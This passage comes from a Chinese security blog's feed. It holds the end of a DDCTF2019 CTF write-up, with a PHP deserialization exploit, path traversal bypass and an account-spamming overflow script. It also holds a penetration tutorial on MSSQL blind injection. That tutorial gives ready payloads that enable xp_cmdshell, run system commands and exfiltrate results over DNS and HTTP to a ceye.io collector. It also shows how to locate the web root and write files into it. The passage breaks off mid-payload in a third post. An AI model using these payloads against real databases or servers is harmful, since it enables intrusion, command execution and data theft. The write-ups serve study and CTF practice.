class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $session = unserialize($session);</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</div><div class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</div><div class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</div><div class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">                $data = sprintf($data,$v);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</div><div class="line">        $sessionid = <span class="string">''</span>;</div><div class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</div><div class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $userdata = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</div><div class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</div><div class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</div><div class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</div><div class="line">        );</div><div class="line"></div><div class="line">        $cookiedata = serialize($userdata);</div><div class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</div><div class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</div><div class="line">        setcookie(</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</div><div class="line">            $cookiedata,</div><div class="line">            $expire,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</div><div class="line">            );</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">$ddctf = <span class="keyword">new</span> Session();</div><div class="line">$ddctf-&gt;index();</div></pre></td></tr></table></figure><p><strong>通过对代码代码审计可以看到在$session = unserialize($session)这里存在一个反序列化漏洞，这个点应该是个突破点，可以通过传入反序列化字符串触发Application对象当中的_destructs方法，_destructs当中存在任意文件读取，通过任意文件读取就可以读取到flag，另外代码里面限制了$path值为18个字符，结合代码的注释可以大概猜到flag文件为<code>../config/flag.txt</code>。</strong></p><p><strong>但是想要触发反序列化漏洞，首先需要获取到<code>../config/key.txt</code>文件当中的key，否则cookie是不能随意修改的，因为这里存在认证，获取key的方法如下</strong></p><p><strong>第一步，请求Session.php，<code>session_create</code>函数会设置cookie,这里先获取到cookie</strong><br><img src="http://pic.c1imber.top/blog/20190418/aHiYJXKwQHTd.png" alt="mark"></p><p><strong>第二步：将获取到的cookie添加到请求里面，绕过”the cookie data not match”</strong><br><img src="http://pic.c1imber.top/blog/20190418/vtlx25O4WU4w.png" alt="mark"></p><p><strong>接下来在传入post参数nickname的代码处，有一个foreach循环，这里会将key输出，代码如下：</strong><br><img src="http://pic.c1imber.top/blog/20190418/l3Jbk2CXxyoS.png" alt="mark"></p><p><strong>第一次循环，将Welcome my friend %s当中的%s替换为了<code>$_POST[&#39;nickname&#39;]</code>,此时$data变为了Welcome my friend <code>$_POST[&#39;nickname&#39;]</code>,第二次循环，要将key写入$data的时候，%s已经没有了，所以这里只输出了传入的nickname而不是key</strong><br><img src="http://pic.c1imber.top/blog/20190418/NmO1mi9EAbv5.png" alt="mark"><br><strong>那么要想输出key，可以将nickname设置为%s，这样第一次循环后$data变为了Welcome my friend %s，第二次循环后%s就可以被替换为key输出了</strong><br><img src="http://pic.c1imber.top/blog/20190418/y1MpCfVvI1f5.png" alt="mark"><br><strong>获取到key值：<code>EzblrbNSO</code>,得到key后,$cookiedata的值就可以随便构造了，这里构造序列化字符串进行任意文件读取，生成的exp代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> Application();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="keyword">echo</span> md5(<span class="string">'EzblrbNSO:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>因为 <code>$path=str_replace(&#39;../&#39;,&#39;&#39;,$path);$path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);</code>会删除<code>../</code>，所以这里需要使用双写<code>..././</code>绕过,之后得到:</strong></p><p><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}5a014dbe49334e6dbb7326046950bee2</code><br><strong>将生成的exp进行传入cookie当中的ddctf_id请求即可，注意这里需要将<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}</code>部分进行url编码，这样做是为了防止一些特殊字符的影响，然后就可以获取到flag了</strong><br><img src="http://pic.c1imber.top/blog/20190418/vPMp7lTuQoPn.png" alt="mark"></p><p><strong>flag:<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></strong></p><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p><code>http://117.51.148.166/upload.php</code></p><p><strong>题目提供了用户名和密码：</strong></p><pre><code>user：dd@ctfpass：DD@ctf#000</code></pre><p><strong>通过提供用户名密码登陆后看到是一个上传页面</strong><br><img src="http://pic.c1imber.top/blog/20190418/6Pb8mqQLuHSf.png" alt="mark"><br><strong>经过尝试发现这里对图片的16进制头做了检查，另一方面也会对上传的图片进行二次渲染，上传的图片格式都会变成jpg图片格式的</strong></p><p><strong>这里要求上传的图片里必须要phpinfo()这个字符串才能输出flag，但是由于二次渲染会的原因，图片当中插入的代码会被删除，这里需要突破二次渲染，类似于upload-labs的第16关，相关文章如下：</strong></p><p><code>https://xz.aliyun.com/t/2657</code></p><p><strong>这里可以使用文章当中提到的国外大神写的脚本实现对jpg二次渲染的突破</strong></p><p><code>https://github.com/BlackFan/jpg_payload</code><br><strong>最终通过脚本生成的图片成功得到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/QNoDrGXml9h4.png" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20190418/pj6zqJaN3Jd7.png" alt="mark"></p><p>flag:<code>DDCTF{B3s7_7ry_php1nf0_85127c366b3a9fad}</code></p><h3 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h3><p><code>http://117.51.147.155:5050/index.html#/login</code></p><p><strong>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</strong></p><p><strong>注册账户登陆，发现自己只有100余额，但是购买门票需要2000余额</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/BU1uMNLvLkUQ.png" alt="mark"></p><p><strong>于是想到了之前护网杯买大辣条的一道题，这里应该存在整型溢出，经过测试发现这里存在uint32位的整型溢出.在立即购买下订单的时候修改金额为2^32+1，也就是4294967297</strong><br><img src="http://pic.c1imber.top/blog/20190418/ADFyVBLmpLiI.png" alt="mark"></p><p><strong>接下来在支付的时候可以产生溢出，通过1余额购买到门票</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/aDyWIhrtAFI0.png" alt="mark"><br><img src="http://pic.c1imber.top/blog/20190418/km8bh2cjwLJP.png" alt="mark"><br><strong>买到票后可以获得礼包，礼包当中包括了id和ticket，游戏规则大概是这样：每个账号在买完票后都会生成自己的id和ticket，如果想要消灭对方，需要知道对方的id和ticket才可以。</strong></p><p><strong>但是这一点注册账号是没有任何限制的，所以这里可以通过注册大量的账号，通过溢出购买门票获得id和ticket，之后使用其中一个账号消灭其它的账号即可，整个过程可以通过脚本实现，几个操作的接口如下：</strong></p><p><strong>注册接口</strong><br><code>http://117.51.147.155:5050/ctf/api/register?name=xxx&amp;password=xxx</code></p><p><strong>登陆接口</strong><br><code>http://117.51.147.155:5050/ctf/api/login?name=xxx&amp;password=xxx</code></p><p><strong>请求支付/下订单接口,下完订单会返回对应的bill_id</strong><br><code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297</code></p><p><strong>支付接口：通过溢出实现门票购买,购买成功后会返回对于的id和ticket</strong><br><code>http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=</code></p><p><strong>移除对手接口</strong><br><code>http://117.51.147.155:5050/ctf/api/remove_robot?id=xxx&amp;ticket=xxx</code></p><p><strong>最终编写出脚本如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line">username=[]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        url=<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=mk%s&amp;password=12345678"</span>%(i)</div><div class="line">        r=requests.get(url).json()</div><div class="line">        <span class="keyword">print</span> r</div><div class="line">        <span class="keyword">if</span> len(username)==<span class="number">400</span>:</div><div class="line">            <span class="keyword">print</span> username</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> r[<span class="string">'code'</span>]==<span class="number">200</span>:</div><div class="line">            username.append(<span class="string">"mk%s"</span>%(i))</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">register()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> username:</div><div class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=12345678"</span>%(i)</div><div class="line">    <span class="comment">#print url</span></div><div class="line">    r=requests.session()</div><div class="line">    r.get(url)</div><div class="line">    payurl=<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297"</span></div><div class="line">    data=r.get(payurl).json()</div><div class="line">    bill_id=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</div><div class="line">    pay=<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</div><div class="line">    data=r.get(pay).json()</div><div class="line">    yourid=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>]</div><div class="line">    ticket=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</div><div class="line">    r.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=st4rk&amp;password=12345678"</span>)</div><div class="line">    delurl=<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(yourid,ticket)</div><div class="line">    <span class="keyword">print</span> r.get(delurl).json()</div></pre></td></tr></table></figure><p><strong>接下来就可以执行脚本获取flag，需要注意的一点就是这里不是每个账号都可以消灭成功的，而且越往后，消灭的概率就会越低，写这道题的时候自己大概注册了快10000个账号才吃到鸡==</strong></p><p><strong>最终获取到flag:</strong><br><img src="http://pic.c1imber.top/blog/20190418/Bof7wUbqtsYX.png" alt="mark"></p><p><strong>flag:<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-write-up&quot;&gt;&lt;a href=&quot;#DDCTF2019-write-up&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019 write up&quot;&gt;&lt;/a&gt;DDCTF2019 write up&lt;/h1&gt;&lt;p&gt;&lt;stron
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</title>
    <link href="https://c1aysec.github.io/2019/03/17/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8dnslog%E5%8A%A0%E5%BF%AB%E7%9B%B2%E6%B3%A8%E9%80%9F%E5%BA%A6(MSSQL%E7%AF%87)/"/>
    <id>https://c1aysec.github.io/2019/03/17/渗透技巧-使用dnslog加快盲注速度(MSSQL篇)/</id>
    <published>2019-03-17T13:36:43.000Z</published>
    <updated>2020-03-31T04:41:25.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度-MSSQL篇"><a href="#渗透技巧-使用dnslog加快盲注速度-MSSQL篇" class="headerlink" title="渗透技巧-使用dnslog加快盲注速度(MSSQL篇)"></a>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</h1><p><strong>关于dnslog盲注，之前写过的两篇文章：</strong></p><p><strong>渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</strong></p><p><strong>记一次dnslog接收异常分析</strong></p><p><strong>这一次详细的总结一下dnslog在mssql盲注当中的使用</strong></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><pre><code>1.服务器操作系统为windows2.mssql数据库支持master..xp_dirtree存储过程3.mssql注入点支持执行多语句4.mssql相对与mysql的优势在于可以执行系统命令，前提是需要支持master..xp_cmdshell存储过程。</code></pre><p><strong>可以看到，相比于mysql数据库，mssql的利用方法相对来说更多一些，下面介绍两种外带数据查询的方法</strong></p><h3 id="DNS外带查询"><a href="#DNS外带查询" class="headerlink" title="DNS外带查询"></a>DNS外带查询</h3><p><strong>注入点如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191108/0MNqLkFU7N2k.png?imageslim" alt="mark"></p><p><strong>注入类型为布尔盲注或者时间盲注，传参本来为get，但是长度有限制，改为post传参即可以突破限制，可以看到有10s的延时</strong></p><p><strong>尝试使用dnslog获取当前用户：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2buser%2b&apos;.xxx.ceye.io/abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>注意这里由于POST DATA参数解析的问题，+会被当成空格，所以需要进行url编码，将+变为%2b</strong></p><p><strong>简单说一下这条sql语句的意思，首先将user的执行结果拼接进unc路径，接着通过xp_dirtree存储过程向unc路径发起请求，产生dns查询，在dnslog平台留下记录，可以看到dnslog接收到的user为dbo</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/yTHkeMQajXPz.png?imageslim" alt="mark"></p><p><strong>查看@@version数据库版本，由于长度超过了128个字符，需要分几次截取</strong></p><p><strong>首先确定长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(@@version) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>因为len的结果为数字型，mssql并不存在类型转换的特性，所以数字不能与字符串直接拼接，这里需要通过cast转化为字符型，可以看到接收到长度为189字节</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/zBqBnylhQOg4.png?imageslim" alt="mark"></p><p><strong>由于unc长度有限制，直接获取的话内容会被截断，所以要分两次截取：</strong></p><p><strong>第一次 1-95</strong></p><p><strong>第二次 95-189</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,1,95))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--  declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,96,94))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>通过两次的截取成功获取到了完整的数据库版本信息</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/GKQOgwoG6SQk.png?imageslim" alt="mark"></p><pre><code>microsoft sql server 2000 - 8.00.2039 (intel x86) may 3 2005 23:18:38 copyright (c) 1988-2003 microsoft corporation enterprise edition on windows nt 5.2 (build 3790: service pack 2)</code></pre><p><strong>当然还需要考虑一种特殊情况，假设说查询结果当中出现了一些unc路径不允许的特殊字符，那么在截取之前还需要进行一次16进制编写码</strong></p><p><strong>mssql当中字符串转16进制函数：</strong></p><pre><code>master.dbo.fn_varbintohexstr(xxx as VARBINARY(num))</code></pre><p><strong>首先查看版本信息16进制编码结果的长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000)))) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/9xUX1j8mJVnx.png?imageslim" alt="mark"></p><p><strong>长度为758，分几次截取就可以得到完整的结果</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),61,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),121,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),181,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),241,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- .........declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),661,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),721,37))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/MnCF17wsmOEk.png?imageslim" alt="mark"></p><p><strong>可以看到dnslog接收到了每一次的结果，将结果拼接后得到：</strong></p><pre><code>4d006900630072006f0073006f00660074002000530051004c00200053006500720076006500720020002000320030003000300020002d00200038002e00300030002e0032003000330039002000280049006e00740065006c002000580038003600290020000a0009004d0061007900200020003300200032003000300035002000320033003a00310038003a003300380020000a00090043006f0070007900720069006700680074002000280063002900200031003900380038002d00320030003000330020004d006900630072006f006e000a00090045006e00740065007200700072006900730065002000450064006900740069006f006e0020006f006e002000570069006e0064006f007700730020004e005400200035002e003200200028004200750069006c006400200033003700390030003a002000530065007200760069006300650020005000610063006b002000320029000a0</code></pre><p><strong>再进行16进制解码</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/k5McwtBhcWju.png?imageslim" alt="mark"></p><p><strong>通过上面的思路，我们就可以获取任何数据了,同样也可以执行命令，首先看一下数据库是否支持master..xp_cmdshell这个存储过程，如果没有需要开启</strong></p><pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;-- </code></pre><p><strong>测试注入点是否可以执行命令，最简单的办法就是ping一下ceye.io的二级域名，如果有dns记录，那就是支持了</strong></p><pre><code>exec master..xp_cmdshell &quot;ping aaa.xxx.ceye.io&quot;;-- </code></pre><p><strong>通过以下几个步骤可以将执行命令的结果回显至dnslog</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><pre><code>CREATE TABLE tt_tmp (id INT PRIMARY KEY IDENTITY,tmp1 nvarchar(4000));-- </code></pre><p><strong>第二步：将命令执行结果插入临时表：</strong></p><pre><code>DECLARE @code varchar(4000);SET @code=0x77686f616d69;insert into tt_tmp(tmp1) exec master..xp_cmdshell @code;-- </code></pre><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select rtrim(cast(COUNT(*) as char(32))) from tt_tmp)%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(cast((select tmp1 from tt_tmp where id=1) as char(255)) as VARBINARY(4000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- 1-6061-120121-180181-240241-300301-360361-420421-480481-512</code></pre><p><strong>成功后记得删除临时表</strong></p><pre><code>drop table tt_tmp;-- </code></pre><p><strong>主要过程就是创建一个临时表，然后读取临时表，将读取的结果发送至dnslog，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/gdOYM8Vnn0yl.png?imageslim" alt="mark"></p><h3 id="HTTP外带查询"><a href="#HTTP外带查询" class="headerlink" title="HTTP外带查询"></a>HTTP外带查询</h3><p><strong>通过第一种方法，可以看到dns外带查询对长度以及一些特殊字符都有着严格的限制，比较麻烦，为了解决这个问题，可以通过HTTP外带查询的方式去代替</strong></p><p><strong>可以通过cmd命令，将执行命令的结果拼接进url，启动浏览器进程去发起http请求</strong></p><p><strong>执行whoami</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;whoami&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Qd6243BxirrD.png?imageslim" alt="mark"></p><p><strong>执行dir</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;dir&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Nv2m454pz5MX.png?imageslim" alt="mark"></p><p><strong>但是通过这种方法获取到的结果，会被空格截断，可以看到上面接收的结果都是不完整的，遇到空格就会被截断，不显示后面的内容</strong></p><p><strong>另外这种方法还有一些缺点，就是会在服务器启动大量的浏览器进程，有可能会导致服务器卡死或者被防火墙拦截，需要时不时的关闭浏览器进程</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- </code></pre><p><strong>其它思路</strong></p><p><strong>可以通过此方法获取网站的根目录，之后将命令的执行结果写入到根目录的一个文件中</strong></p><p><strong>遍历C盘下的aspx后缀文件</strong></p><pre><code>exec master..xp_cmdshell &quot;for /r C:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/LF9YA9cPAbmS.png?imageslim" alt="mark"></p><p><strong>遍历D盘下的aspx文件</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- exec master..xp_cmdshell &quot;for /r D:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/n67mO6S9UwDH.png?imageslim" alt="mark"></p><p><strong>最终确定了D:/zhenghedabu/这个路径就是网站的物理路径了。</strong></p><p><strong>获取到网站的物理路径后，会有更多的利用手法</strong></p><p><strong>比如可以将命令的执行结果输出到网站目录下的一个txt文本文件当中当中</strong></p><pre><code>exec master..xp_cmdshell &quot;ipconfig &gt; D:\zhenghedabu\tmp2019.txt&quot;-- </code></pre><p><strong>之后可以看到命令执行的结果</strong><br><img src="http://pic.c1imber.top/blog/20191109/jg9FftdPdj94.png?imageslim" alt="mark"></p><p><strong>同样的，知道了网站物理路径，也可以直接写入webshell</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>使用dnslog可以有效的增加渗透的效率，避免了在盲注上花费过多的时间，但是思路也不能单单禁锢于这一种方式，比如mssql的注入点，可以执行命令，那么也可以直接通过反弹shell到公网的服务器上的。所以方法思路还是很多的，要合理使用才能事半功倍。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧-使用dnslog加快盲注速度(MSSQL篇)&quot;&gt;&lt;/a&gt;渗透技巧-使用
      
    
    </summary>
    
      <category term="web安全" scheme="https://c1aysec.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://c1aysec.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>记一次dnslog接收异常分析</title>
    <link href="https://c1aysec.github.io/2019/01/11/%E8%AE%B0%E4%B8%80%E6%AC%A1dnslog%E6%8E%A5%E6%94%B6%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2019/01/11/记一次dnslog接收异常分析/</id>
    <published>2019-01-11T08:08:50.000Z</published>
    <updated>2019-11-08T15:37:59.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次dnslog接收异常分析"><a href="#记一次dnslog接收异常分析" class="headerlink" title="记一次dnslog接收异常分析"></a>记一次dnslog接收异常分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下</strong></p><a id="more"></a><p><strong>通过手工注入将命令执行结果发送至dnslog的语句如下：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">--</span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- 